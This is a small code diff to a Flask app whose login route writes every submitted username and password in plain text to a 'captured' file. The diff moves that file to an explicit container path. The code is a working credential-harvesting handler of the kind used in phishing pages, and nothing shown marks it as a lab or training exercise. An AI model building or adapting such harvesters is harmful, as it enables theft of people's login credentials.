@@ -1,4 +1,4 @@
-from flask import Flask, request, render_template, redirect, url_for
+from flask import Flask, request, render_template
 
 app = Flask(__name__)
 
@@ -10,7 +10,8 @@ def index():
 def login():
     username = request.form.get("username", "")
     password = request.form.get("password", "")
-    with open("captured.txt", "a", encoding="utf-8") as f:
+    # write captured credentials to an explicit path inside the container
+    with open("/app/captured.txt", "a", encoding="utf-8") as f:
         f.write(f"{username}\t{password}\n")
     return f"Received credentials for user: {username}"
 
